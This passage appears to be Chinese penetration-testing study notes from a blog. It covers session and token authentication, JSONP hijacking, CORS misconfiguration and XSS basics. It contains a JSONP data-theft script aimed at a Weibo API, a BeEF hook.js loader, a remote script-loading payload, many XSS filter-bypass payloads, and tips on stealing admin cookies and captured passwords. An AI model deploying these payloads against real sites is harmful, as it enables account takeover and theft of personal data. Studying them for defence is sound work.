的唯一标识信息 SessionID 返回给浏览器 浏览器接收到服务器返回的 SessionID 信息后，会将此信息存入到 Cookie 中，同时 Cookie 记录此 SessionID 属于哪个域名 当用户第二次访问服务器的时候，请求会自动判断此域名下是否存在 Cookie 信息，如果存在自动将 Cookie 信息也发送给服务端，服务端会从 Cookie 中获取 SessionID，再根据 SessionID 查找对应的 Session 信息，如果没有找到说明用户没有登录或者登录失效，如果找到 Session 证明用户已经登录可执行后面操作。 根据以上流程可知，SessionID 是连接 Cookie 和 Session 的一道桥梁，大部分系统也是根据此原理来验证用户登录状态。由于关闭浏览器不会导致 session 被删除，迫使服务器为 session 设置了一个失效时间，当距离客户端上一次使用 session 的时间超过这个失效时间时，服务器就认为客户端已经停止了活动，才会把 session 删除以节省存储空间。 TOKEN 访问资源接口（API）时所需要的资源凭证 简单 token 的组成： uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，token 的前几位以哈希算法压缩成的一定长度的十六进制字符串） 特点： 服务端无状态化、可扩展性好 支持移动端设备 安全 支持跨程序调用 token 的身份验证流程： 客户端使用用户名跟密码请求登录 服务端收到请求，去验证用户名与密码 验证成功后，服务端会签发一个 token 并把这个 token 发送给客户端 客户端收到 token 以后，会把它存储起来，比如放在 cookie 里或者 localStorage 里 客户端每次向服务端请求资源的时候需要带着服务端签发的 token 服务端收到请求，然后去验证客户端请求里面带着的 token ，如果验证成功，就向客户端返回请求的数据 特点： 每一次请求都需要携带 token，需要把 token 放到 HTTP 的 Header 里 基于 token 的用户认证是一种服务端无状态的认证方式，服务端不用存放 token 数据。用解析 token 的计算时间换取 session 的存储空间，从而减轻服务器的压力，减少频繁的查询数据库 token 完全由应用管理，所以它可以避开同源策略 JWT JSON Web Token（简称 JWT）是目前最流行的跨域认证解决方案。 是一种认证授权机制。 JWT 是为了在网络应用环境间传递声明而执行的一种基于 JSON 的开放标准（RFC 7519）。JWT 的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用在用户登录上。 可以使用 HMAC 算法或者是 RSA 的公/私秘钥对 JWT 进行签名。因为数字签名的存在，这些传递的信息是可信的。 JWT 认证流程： 用户输入用户名/密码登录，服务端认证成功后，会返回给客户端一个 JWT 客户端将 token 保存到本地（通常使用 localstorage，也可以使用 cookie） 当用户希望访问一个受保护的路由或者资源的时候，需要请求头的 Authorization 字段中使用Bearer 模式添加 JWT，其内容看起来是下面这样Authorization: Bearer &lt;token&gt; 服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为 因为 JWT 是自包含的（内部包含了一些会话信息），因此减少了需要查询数据库的需要 因为 JWT 并不使用 Cookie 的，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS） 因为用户的状态不再存储在服务端的内存中，所以这是一种无状态的认证机制 JWT 的使用方式 客户端收到服务器返回的 JWT，可以储存在 Cookie 里面，也可以储存在 localStorage。 方式一 当用户希望访问一个受保护的路由或者资源的时候，可以把它放在 Cookie 里面自动发送，但是这样不能跨域，所以更好的做法是放在 HTTP 请求头信息的 Authorization 字段里，使用 Bearer 模式添加 JWT。 123GET /calendar/v1/eventsHost: api.example.comAuthorization: Bearer &lt;token&gt; 用户的状态不会存储在服务端的内存中，这是一种 无状态的认证机制 服务端的保护路由将会检查请求头 Authorization 中的 JWT 信息，如果合法，则允许用户的行为。 由于 JWT 是自包含的，因此减少了需要查询数据库的需要 JWT 的这些特性使得我们可以完全依赖其无状态的特性提供数据 API 服务，甚至是创建一个下载流服务。 因为 JWT 并不使用 Cookie ，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS） 方式二 跨域的时候，可以把 JWT 放在 POST 请求的数据体里。 方式三 通过 URL 传输：http://www.example.com/user?token=xxx 常见的前后端鉴权方式 Session-Cookie Token 验证（包括 JWT，SSO单点登录认证） OAuth2.0（开放授权） Cookie 、Session和Token的对比 属性 Cookie Session Token（JWT） 安全性 差 - 好（不会有CORS劫持） 存储方式 由浏览器存储 由服务器存储 由应用管理 存储大小 小（且时间长） 理论无限大（时间短） - 功能差异 1. 移动端支持差；2. 无法跨域 - 1. 移动端支持好 实现方式 存储与比对，会存储会话信息 存储与比对，会存储会话信息 直接解析比对，不依赖cookie，不会存储会话信息 同源策略 所谓的同源就是：协议+主机（域名）+端口都相同，一般来说，主机协议不一样，那么端口就不一样，就像http 80 https 443一样。 主要用来防止跨源操作，例如，读和写。 但是我们有时候需要引入外部资源，这个同源一棒子全部打死，咋办？ 这时候有两种解决方式一个是JSONP，一个是CORS： 一个是通过src标签属性来绕过检查 一个是通过双方验证允许的列表，来保证导入的数据是好的 他们分别会导致不同的劫持。 同源判断示例：URL地址 http://www.example.com/dir/page.html Compared URL Outcome Reason http://www.example.com/dir/page2.html Success Same protocol, host and port http://www.example.com/dir2/other.html Success Same protocol, host and port http://domain-ip/dir/page2.html Failure Different host (exact match required) http://username:password@www.example.com/dir2/other.html Success Same protocol, host and port http://www.example.com:81/dir/other.html Failure Same protocol and host but different port https://www.example.com/dir/other.html Failure Different protocol http://en.example.com/dir/other.html Failure Different host http://example.com/dir/other.html Failure Different host (exact match required) http://v2.www.example.com/dir/other.html Failure Different host (exact match required) http://www.example.com:80/dir/other.html Depends Port explicit. Depends on implementation in browser JSONP——填充式 JSON JSONP 是 JSON with padding（填充式 JSON 或参数式 JSON）的简写。JSONP实现跨域请求的原理简单的说，就是动态创建&lt;script&gt;标签，然后利用&lt;script&gt;的src 不受同源策略约束来跨域获取数据。JSONP 就是为了跨域获取资源而产生的一种非官方的技术手段(官方的有 CORS 和 postMessage),它利用的是 script 标签的 src 属性不受同源策略影响的特性。 JSONP 由两部分组成：回调函数和数据。回调函数是当响应到来时应该在页面中调用的函数。回调函数的名字一般是在请求中指定的。而数据就是传入回调函数中的 JSON 数据。 动态创建&lt;script&gt;标签，设置其src，回调函数在src中设置： 123var script = document.createElement(&quot;script&quot;);script.src = &quot;https://api.douban.com/v2/book/search?q=javascript&amp;count=1&amp;callback=handleResponse&quot;;document.body.insertBefore(script, document.body.firstChild); 在页面中，返回的JSON作为response参数传入回调函数中，我们通过回调函数来来操作数据。 123function handleResponse(response)&#123; // 对response数据进行操作代码&#125; 劫持 那么劫持又是怎么回事呢？其实我们在学安全的过程中对劫持这个词可以说是一点也不陌生，我们遇到过很多的劫持的攻击方法，比如：dns 劫持、点击劫持、cookie劫持等等，也正如劫持这个词的含义：“拦截挟持”，dns 劫持就是把 dns 的解析截获然后篡改，点击劫持就是截获你的鼠标的点击动作，在用户不知情的情况下点击攻击者指定的东西，cookie 劫持就是获取用户的 cookie，然后可以进一步伪造身份，那么同样， jsonp 劫持就是攻击者获取了本应该传给网站其他接口的数据。 劫持利用过程 通过JSONP技术可以实现数据的跨域访问，必然会产生安全问题。 如果网站B对网站A的JSONP请求没有进行安全检查直接返回数据，则网站B 便存在JSONP 漏洞，网站A 利用JSONP漏洞能够获取用户在网站B上的数据。 用户在网站B 注册并登录，网站B 包含了用户的id，name，email等信息； 用户通过浏览器向网站A发出URL请求； 网站A向用户返回响应页面，响应页面中注册了JavaScript的回调函数和向网站B请求的script标签，示例代码如下： 1234567&lt;script type=&quot;text/javascript&quot;&gt;function Callback(result)&#123; alert(result.name);&#125;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://B.com/user?jsonp=Callback&quot;&gt;&lt;/script&gt; 用户收到响应，解析JS代码，将回调函数作为参数向网站B发出请求； 网站B接收到请求后，解析请求的URL，以JSON 格式生成请求需要的数据，将封装的包含用户信息的JSON数据作为回调函数的参数返回给浏览器，网站B返回的数据实例如下： 1Callback(&#123;&quot;id&quot;:1,&quot;name&quot;:&quot;test&quot;,&quot;email&quot;:&quot;test@test.com&quot;&#125;)。 网站B数据返回后，浏览器则自动执行Callback函数对步骤4返回的JSON格式数据进行处理，通过alert弹窗展示了用户在网站B的注册信息。另外也可将JSON数据回传到网站A的服务器，这样网站A利用网站B的JSONP漏洞便获取到了用户在网站B注册的信息。 实例： 攻击者通过巧妙设计一个网站，网站中包含其他网站的JSONP漏洞利用代码，将链接通过邮件等形式推送给受害人，**如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，**这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。 挖掘思路 这里我采用chrome浏览器的调试窗口进行挖掘weibo.com中存在的漏洞(测试之前需要登录一下，因为我们需要检测是不是会有敏感信息泄露) 首先把Preserve log选项勾上，这样用来防止页面刷新跳转的时候访问记录被重置，也方便我们进行下一步的筛选。 然后 F5 刷新，进入 NetWork 标签 ，CTRL+F 查找一些关键词 如 callback json jsonp email 然后我们需要人工确认这个请求的返回值是否有泄露用户的敏感信息，并且能被不同的域的页面去请求获取，这里以上面查找到的 jsonp 为例，发现换成了别的浏览器还是能检测到，说明验证的来源有些问题 自动化查找 自动化测试工具Selenium + Proxy + 验证脚本 Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口； Proxy：用于代理所有的请求，过滤出所有包含敏感信息的JSONP请求，并记录下HTTP请求； 验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！ 利用 JSONP 漏洞主要被攻击者用来在受害者不知不觉中窃取他们的隐私数据，常常被一些 APT 组织采用进行信息收集和钓鱼的工作(水坑攻击)，下面的一个例子就可以说是在模拟水坑攻击 当我们发现信息泄露的 jsonp 接口以后我们要做的就是在自己的网站上写一个脚本，然后引诱受害者去访问这个网站，一旦访问了这个网站，脚本就会自动运行，就会想这个接口请求用户的敏感数据，并传送到攻击者的服务器上 12345678910111213141516$.ajax(&#123; url: &#x27;https://api.weibo.com/2/&#123;隐藏了哦&#125;&#x27;, type: &#x27;get&#x27;, dataType: &#x27;jsonp&#x27;,&#125;).done(function(json)&#123; var id = json[&quot;data&quot;][&quot;id&quot;]; var screen_name = json[&quot;data&quot;][&quot;screen_name&quot;]; var profile_image_url = json[&quot;data&quot;][&quot;profile_image_url&quot;]; var post_data = &quot;&quot;; post_data += &quot;id=&quot; + id + &quot;&amp;amp;&quot;; post_data += &quot;screen_name=&quot; + screen_name + &quot;&amp;amp;&quot;; post_data += &quot;profile_image_url=&quot; + encodeURIComponent(profile_image_url); console.log(post_data); // 发送到我的服务器上&#125;).fail(function() &#123;&#125;); 利用代码：https://github.com/qiaofei32/jsonp_info_leak 防护 严格安全的实现 CSRF 方式调用 JSON 文件：限制 Referer 、部署一次性 Token 等。 严格按照 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。 严格过滤 callback 函数名及 JSON 里数据的输出。 严格限制对 JSONP 输出 callback 函数名的长度(如防御上面 flash 输出的方法)。 其他一些比较“猥琐”的方法：如在 Callback 输出之前加入其他字符(如：/**/、回车换行)这样不影响 JSON 文件加载，又能一定程度预防其他文件格式的输出。还比如 Gmail 早起使用 AJAX 的方式获取 JSON ，听过在输出 JSON 之前加入 while(1) ;这样的代码来防止 JS 远程调用。 CORS——跨来源资源共享 CORS（Cross-Origin Resource Sharing 跨来源资源共享），CORS允许浏览器向跨域服务器发出XmlHttpRequest请求，CORS与JSONP的区别：是JSONP的升级版，JSONP只能通过get方式请求，CORS支持get和post请求。 CORS跨域原理：向header中注入Access-Control-Allow-Origin服务端过判断请求头中的参数是否被允许的域来决定请求源是否有权限获取数据。如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。 字段 Access-Control-Allow-Origin：该字段是必须存在的，它的值可能是 Origin 字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大； Access-Control-Allow-Credentials 该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。但需要注意的是，如果要发送 cookie，Access-Control-Allow-Origin 就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略， 只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。 简单流程 这个响应头表示访问允许，*符号表示所有的请求源的所有形式的请求，都被允许访问数据，这样也就造成了一个跨域读取敏感信息的漏洞。 改为百度成功,假如我改成自己服务器上的话,是不是在本机就能读取到别人的敏感信息呢? 如何快速判断是否存在CORS漏洞 1234567891011121314最好的攻击案例：Access-Control-Allow-Origin: https://attacker.comAccess-Control-Allow-Credentials: true可能存在利用点：Access-Control-Allow-Origin: nullAccess-Control-Allow-Credentials: true配置失误，但是几乎无法利用：Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true或者只有一个：Access-Control-Allow-Origin: * 修复建议： 加强对access-control-allow-orign的控制； 另外提一下大平台很喜欢利用cors跨域读取资源，多多使用f12打法有奇效。总的来说jsonp劫持和cors跨域都是属于csrf漏洞的一种,需要诱骗受害者点击才能触发,就是返回信息的接口被攻击者调用了 返回了敏感数据给其他人。 检测 CORS 漏洞主要看当我们发起的请求中带有 Origin 头部字段时，服务器的返回包带有 CORS 的相关字段并且允许 Origin 的域访问。 一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。 首先是自动在 HTTP 请求包中加上 Origin 的头部字段，打开BurpSuite，选择 Proxy 模块中的 Options 选项，找到 Match and Replace 这一栏，勾选 Request header 将空替换为 Origin:foo.example.org 的Enable框： 然后我们就可以开始去访问我们认为有漏洞的网站，访问足够多后在 BurpSuite 的 Proxy 模块下的 HTTP history 来筛选带有 CORS 头部的值： 条件可以是： 12Access-Control-Allow-Origin: foo.example.orgAccess-Control-Allow-Credentials: true 这里要注意的是，我们也可以测试下带有 CORS 字段的网站是否有 CORS 漏洞，如果服务器响应包的请求头是以下几种情况则可存在 CORS 漏洞 一定有： 1234Access-Control-Allow-Origin: *或Access-Control-Allow-Origin: https://attacker.comAccess-Control-Allow-Credentials: true 可能：（同时出现） 12Access-Control-Allow-Origin: nullAccess-Control-Allow-Credentials: true 没有：(浏览器会自动截至) 12Access-Control-Allow-Origin: *Access-Control-Allow-Credentials: true 有时候 CORS 配置了信任自身的任意子域，那么如果一个子域存在 XSS 漏洞就可以通过这个漏洞去读取其他子域的资源，类似的场景还有比如 HTTPS 域信任 HTTP 域等。 工具 https://github.com/chenjj/CORScanner。 详细说明+payload https://github.com/AI0TSec/blog/issues/9 防护 关闭不必要开启的CORS； 白名单限制：定义“源”的白名单，避免使用正则表达式，不要配置 Access-Control-Allow-Origin 为通配符 * 或 null ，严格效验来自请求数据包中的 Origin 的值； 仅允许使用安全协议，避免中间人攻击； 尽可能的返回 Vary: Origin 头部，以避免攻击者利用浏览器缓存进行攻击； 避免将 Access-Control-Allow-Credentials 标头设置为默认值 true ，跨域请求若不存在必要的凭证数据，则根据实际情况将其设置为 false； 限制跨域请求允许的方法，Access-Control-Allow-Methods 最大限度地减少所涉及的方法，降低风险； 限制浏览器缓存期限：建议通过 Access-Control-Allow-Methods 和 Access-Control-Allow-Headers 头部，限制浏览器缓存信息的时间。通过配置 Access-Control-Max-Age 标头来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值，确保浏览器在短时间内可以更新策略； 仅在接收到跨域请求时才配置有关于跨域的头部，并确保跨域请求是合法的源，以减少攻击者恶意利用的可能性。","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://j3f5.github.io/tags/XSS/"},{"name":"CSRF","slug":"CSRF","permalink":"https://j3f5.github.io/tags/CSRF/"},{"name":"劫持","slug":"劫持","permalink":"https://j3f5.github.io/tags/%E5%8A%AB%E6%8C%81/"},{"name":"跨域","slug":"跨域","permalink":"https://j3f5.github.io/tags/%E8%B7%A8%E5%9F%9F/"}]},{"title":"XSS跨站基础","slug":"XSS跨站基础","date":"2023-05-30T08:40:42.000Z","updated":"2023-06-01T03:09:45.000Z","comments":true,"path":"articles/2023/05/30/XSS跨站基础/","link":"","permalink":"https://j3f5.github.io/articles/2023/05/30/XSS%E8%B7%A8%E7%AB%99%E5%9F%BA%E7%A1%80/","excerpt":"","text":"XSS跨站基础 原理 恶意攻击者在web页面中会插入一些恶意的javascript代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。 层面：一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果 函数：比如说php中的脚本的输出函数：常见的输出函数有：print、print_r、echo、printf、sprintf、die、var_dump、var_export 危害影响 攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。 网络钓鱼，包括获取各类用户账号； 窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作； 劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等； 强制弹出广告页面、刷流量等； 网页挂马； 进行恶意操作，如任意篡改页面信息、删除文章等； 进行大量的客户端攻击，如ddos等； 获取客户端信息，如用户的浏览历史、真实ip、开放端口等； 控制受害者机器向其他网站发起攻击； 结合其他漏洞，如csrf,实施进一步危害； 提升用户权限，包括进一步渗透网站； 传播跨站脚本蠕虫等 注意：浏览器的内核会影响攻击的产生（会阻止），所以，XSS的危害会受到很多因素的影响。 攻击成功的条件：对方有漏洞，浏览器存有cookie，浏览器不进行拦截，不存在带代码过滤和httponly，对方要触发这个漏洞地址 出现位置 文章发表、评论、留言、注册资料、修改资料等地方 什么位置是有用的？ 一般XSS漏洞，厂家是不收的，因为有很多的限制条件，但是我们如果在订单发布等地方发现了XSS存储型漏洞，那么这个漏洞是很有价值的。因为管理员会经常访问订单页面查看，不需要我们去发链接给他触发。 重点位置： 留言板 评论区 订单系统 反馈信息 测试手法 盲打，直接冲，乱甩payload。注意，这个位置必须是上面的位置！ 攻击类型分类 反射型：发包 =&gt; x.php =&gt; 回包 存储型：发包 =&gt; x.php =&gt; 数据库 =&gt; 回包 DOM型：发包 =&gt; 本地浏览器静态前端代码 =&gt; x.php 反射型 反射性xss一般指攻击者通过特定的方式来诱惑受害者去访问一个包含恶意代码的URL。当受害者点击恶意链接url的时候，恶意代码会直接在受害者的主机上的浏览器执行。是需要点击才能攻击。 场景：攻击者发送一个带有恶意连接的邮件给受害者，受害者点击。 存储型 存储型XSS时常伴随着SQL注入。它的特征是，XSS攻击Payload是被写到数据库里面了。是持续性的攻击。 场景：受害者正常访问网页，网页会执行XSS脚本。 DOM型 在翻页的时候，有两种：一种是点击第二页，然后跳转，另一种是点击展示更多，然后加载。前者是与PHP等后端语言打交道，然后生成页面。后者是与HTML打交道，然后重新构造DOM（插入），生成更多的视图。 而JS可以操作HTML DOM结点！ 官方解释： 基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。 用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存在XSS漏洞。 如下面的HTML文件就存在DOM型XSS，其功能是当我们在URL栏输入参数name的值后，就会在当前页面显示输入如的name的值，其功能的实现全都在前端JS中进行、未与后台进行任何交互： 123456789101112&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;DOM XSS&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt; var pos=document.URL.indexOf(&quot;name=&quot;)+5; document.write(decodeURI(document.URL.substring(pos,document.URL.length)));&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 从代码层面看，漏洞形成原因很简单，document.URL获取用户输入，在代码中未经过任何过滤就传递给了document.write输出到当前页面中。 当我们正常输入name值时页面直接显示输入的内容，F12查看DOM文档可看到输入的内容确实是插入到当前DOM结构中： 也就是说DOM结构我们用户输入可控，当我们输入XSS payload时就会弹框，造成DOM型XSS。 从挖洞角度看，任何漏洞都是从外部输入加上危险的操作导致的，这里DOM型XSS也不例外。 DOM型XSS中，其外部输入是JS中存在获取外部输入内容的可利用的代码如URL栏内容的location.href，然后该外部输入内容在未经过有效过滤的情况下就传入危险的输出函数直接输出到页面中或传入eval等危险执行函数就会在页面上直接解析恶意JS代码，导致DOM型XSS的存在。 参考链接：https://www.mi1k7ea.com/2019/06/25/浅析DOM型XSS/ 下面列下外部输入Sources和危险敏感操作Sinks（包括执行/输出页面），而对于DOM型XSS漏洞挖掘来说，可以简单归纳为在客户端加载的JS代码中，存在Sources+Sinks的情况即有可能存在DOM型XSS。具体见附录。 实际攻击示例 发现订单页面： 登录XSS平台，复制他给的PAYLOAD 注入之后，等到管理员打开订单系统查看信息，那么就会出发漏洞，我们可以从XSS平台上获得相关信息，例如cookie 获得COOKIE后使用Postman构造包，模拟发送接收，重现登录到后台系统的操作。 注：也可以自己写代码接收数据。自己构建XSS平台。 手法 XSS平台的使用 平台有很多，直接上网搜“XSS”平台即可。还有著名的Beef平台。 xssaq.com 上面说过简单的利用。大致都是复制平台上的Payload，放到可能有xss注入的地方。然后再平台上进行相关操作。 XSS工具的使用 beef-xss，就是复制他给的攻击Payload，直接冲就完事了。然后他通过hook.js实现对网站的攻击。可以实现跳转啊之类的。 1&lt;script src=&quot;http://IP:3000/hook.js&quot;&gt;&lt;/script&gt; IP地址扫描 结合JBoss攻击… 实际上他是 禁止加载外域的代码。 XSS结合其他漏洞 绕过 代码过滤 测试是否存在过滤 输入asdf&lt;'&quot;=&gt;asdf 这个有没有被过滤。如果看源码这个都没有转码成&amp;gt;&amp;lt;啥的，就很可能存在XSS漏洞。 因为存在&lt;&gt;与单引号这一类字符，所以HTML不正确，会一直呆在那个页面，而如果正确，则会到成功页面。那时候我们基于这个网址构造的payload就没用了。所以在调试的时候必须让这个页面处于原页面，不让他转。 如果过滤了&lt;&gt;和&quot;，那么可以使用onFocus=‘来完成攻击。 常用的攻击和测试函数： alert eval fromCharCode onChange onFocus &lt;.\\*?&gt; 代码绕过 双写绕过、大小写绕过 伪协议绕过：javascript:alert(1);。注：Javascript:伪协议后面可以使用URL编码。 &lt;IMG SRC=&quot;javascript:alert('XSS');&quot;&gt; &lt;IMG SRC=javascript:alert('XSS')&gt; 利用标签属性： script：&lt;script&gt;alert('1')&lt;/script&gt; &lt;a href=&gt;：&quot;&gt; &lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;（新造一个标签，可以大小写绕过） &lt;img&gt;：&lt;img src=11 onerror=alert(1)&gt; 利用事件： onclick：onclick=alert(1) onfocus：onfocus=javascript:alert(1) onerror：onerror=alert(1)。onerror里的内容是当js解析的,因此可以用JSunicode编码,但是不能全部编码只能编码函数名。如果全部编码是会出错的。onerror支持：html10,html16，jsunicode,不支持js8进制和js16进制 onmouseover：（表示当鼠标移动到该标签上时就会触发执行某项动作）。 利用远程加载： 123&lt;script&gt;$.getScript(&quot;http://raw.githubsercontent.com/GrayHatHacking/GHHv5/master/ch16/test.js&quot;, function()&#123; hack(); &#125;); //&lt;/script&gt; 利用编码： 使用Unicode编码js代码（转码网站）： 注意事项：只有在标签内的script代码才能编码，首先经过unicode编码，然后再去url编码那里，编码后才算完成！ &lt;a href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(1)&gt;Click&lt;/a&gt; URL编码 &lt;a href=javascript:%2561%256c%2565%2572%2574%2528%2531%2529&gt;Click&lt;/a&gt; HTML实体编码 123456空格 &amp;nbsp; &amp;#160; &amp;#x20;&lt; &amp;lt; &amp;#60; &amp;#x3c;&gt; &amp;gt; &amp;#62; &amp;#x3e;&amp; &amp;amp; &amp;#38; &amp;#x26;&quot; &amp;quot; &amp;#34; &amp;#x22;&#x27; &amp;apos; (IE不支持) &amp;#39; &amp;#x27; 第二个就是十进制实体编码，使用&amp;开头； 1&lt;IMG SRC=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt; 第三个就是十六进制实体编码，使用&amp;#x开头，后面的数字跟URL编码是一样的。 需要注意的是，他需要;才能工作。例如&lt;IMG SRC=javascript:alert(&amp;quot;XSS&amp;quot;)&gt; 以上三种编码是可以组合起来的：Unicode URL HTML JavaScript编码 三个八进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\\074” 两个十六进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\\x3c” 四个十六进制数字，如果不够个数，前面补0，例如“&lt;”编码为“\\u003c” 对于一些控制字符，使用特殊的C类型的转义风格（例如\\n和\\r） 在javascript伪协议中可以用（javascript中只识别几种编码：Jsunicode js8进制 js16进制）。 base64编码 在Data协议的时候使用 遇到如下标签： &lt;a href=&quot;可控&quot;&gt; &lt;iframe src=&quot;可控&quot;&gt; &lt;object data=“可控&quot;&gt; 这个时候如果过滤了&lt;&gt;'&quot;JavaScript的话，则可以使用&lt;img src=x οnerrοr=alert(1)&gt;编码成：PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==，然后使用data协议代入可控点： 1&lt;a href=“data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==”&gt;111&lt;/a&gt; 请求头注入：如referer和user-agent等等，都是可以利用的。只要它把这些值放到网页上，就可以利用！ 字符绕过： 空格：换行符%0a。换行时必须用单双引号围住，否则不会跳过。跳过回车和换行,不支持on事件 /：这个时候就不能用闭合标签了，可以使用非闭合的标签如img和a 引用外部资源，即src。 HttpOnly禁止读Cookie httponly：如果给某个 cookie 设置了 httpOnly 属性，则无法通过 JS 脚本读取到该 cookie 的信息，但还可以在 Application 中手动修改 cookie，所以只是在一定程度上可以防止 XSS 攻击，不是绝对的安全。虽然设置了httponly之后拿不到cookie，但是还是存在xss跨站语句，阻止的仅仅是获取cookie。 下面是设置HTTP-only cookie的一个报头的示例： 1Set-Cookie: USER=123; expires=Wednesday, 09-Nov-99 23:12:40 GMT; HttpOnly 绕过： 浏览器未保存帐号密码：需要 xss 产生登录地址（漏洞产生在登录界面），利用表单劫持 设置XSS平台的时候选择：获得对应输入框的明文账号密码，然后去看源码中输入框的type和name之类的参数，设置好就可以传这个XSSpayload进去。 浏览器保存帐号密码：浏览器读取帐号密码 WAF拦截与绕过 标签语法替换 提交方式更改，GET/POST 垃圾数据溢出 加密解密算法 结合其他漏洞绕过 其他 WEBSHELL盒子 有webshell中的webshell，当你利用他的大马传入到一个受害主机上，那么一旦你运行该马，那么这个马就会自动传受害者主机地址，利用的账号密码到他提前设置好的主机上。这样子，写这个马的人就 坐收渔翁之利 ！ 他一般会有一些代码，里面写了什么服务器信息啥的，可以仔细看看，但是他如果一旦混淆了，你就看不到了。 如何探测这个是不是有后门？ 看一下有没有莫名其妙的数据包（用F12），抓包也行。在数据包有没有向外发送数据包，有个莫名其妙的你不懂的IP地址/URL 那么如何反杀？我们可以传一个存储型XSS进去，链上我们的XSS平台，进行黑吃黑吃黑！ 资源 http://xss.fbisb.com/ https://github.com/tennc/webshell https://www.postman.com/downloads/ https://pan.baidu.com/s/1lIUZvEVXs1du-Bmkt7-abA 提取码：xiao https://pan.baidu.com/s/13H4N1VTBVwd3t8YWpECBFw 提取码：xiao Cookie与Session对于XSS的影响 小迪说：如果对方使用session验证，那么我们的xss平台是抓不到它的session的，因为session是存储在服务器的。 **实战webgoat测试：**http://127.0.0.1:8080/WebGoat/start.mvc#lesson/CrossSiteScripting.lesson/6 在传入我们的XSS平台代码时，是可以接收到他的JSESSION的！ 但是怎么利用呢？暂时不知道，经过BURP抓包发现他访问上面的网址会经过各种mvc，例如WebGoat/service/lessonoverview.mvc 之类的，最终到达/WebGoat/start.mvc，/WebGoat/service/lessonmenu.mvc，…，lesson 修复方案 开启 httponly,输入过滤，输出过滤等 PHP:http://www.zuimoge.com/212.html JAVA:https://www.cnblogs.com/baixiansheng/p/9001522.html 使用ESAPI，首先应当配置过滤器；其次将过滤器注册到web.xml文件中；最后配置Request的包装类 附录 资源 https://xss8.cc/xss.php?do=login https://xsshs.cn/xss.php?do=login https://github.com/do0dl3/xss-labs http://down.chinaz.com/soft/37581.htm 工具： 自动化工具：https://github.com/s0md3v/XSStrike 参考 绕过：https://www.ddosi.org/xss-bypass/#绕过WAF的方法——跨站脚本 绕过：https://www.cnblogs.com/H4ck3R-XiX/p/12732356.html DOM型XSS漏洞挖掘——trick函数 Sources document.URL document.URLUnencoded document.location（及其许多属性） document.referrer window.location（及其许多属性） location location.href location.search location.hash location.pathname Sinks 直接执行脚本类 eval(…) window.execScript(…) window.setInterval(…) window.setTimeout(…) 写HTML页面类 document.write(…) document.writeln(…) element.innerHTML(…) 